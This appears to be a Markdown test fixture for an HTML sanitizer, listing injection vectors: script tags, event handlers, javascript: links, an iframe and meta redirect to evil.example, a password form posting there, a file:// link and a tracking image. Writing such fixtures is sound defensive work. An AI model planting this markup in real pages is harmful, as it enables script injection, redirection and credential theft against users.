# Nasty HTML

<script>alert("script")</script>

<img src="x.png" onerror="alert('onerror')">

[a javascript link](javascript:alert('link'))

<a href="JAVASCRIPT:alert('upper')">upper-case javascript</a>

<iframe src="https://evil.example/frame">frame fallback</iframe>

<svg onload="alert('svg')"><circle r="10"/></svg>

<style>body { display: none }</style>

<meta http-equiv="refresh" content="0; url=https://evil.example/">

<a href="file:///C:/Windows/System32/drivers/etc/hosts">a file outside the folder</a>

<p onclick="alert('click')" style="position:fixed">handlers and styles</p>

<form action="https://evil.example/"><input type="password" name="p"></form>

![remote](https://evil.example/track.gif)
